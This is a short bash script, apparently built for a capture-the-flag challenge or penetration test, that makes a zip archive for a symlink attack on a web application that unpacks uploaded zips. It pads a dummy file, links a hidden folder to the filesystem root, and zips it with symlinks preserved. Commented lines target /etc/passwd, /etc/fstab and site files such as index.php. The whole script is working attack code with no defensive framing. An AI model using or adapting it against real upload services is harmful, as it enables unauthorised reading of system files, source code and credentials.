#!/bin/bash
set -e

# file cannot be too small
for i in `seq 1 50`
do
    echo bullsh1t >> testfile.txt
done

# add symlinks
#ln -s /etc/passwd passwd
#ln -s ../../index.php index
#ln -s ../../url.php url
#ln -s /etc/fstab fstab
mkdir .blubb
ln -s / .blubb/.root
cp testfile.txt .blubb/.testfile.txt


# zip stuff
zip -r --symlinks cmd.zip testfile.txt .blubb

# cleanup
rm -r .blubb testfile.txt
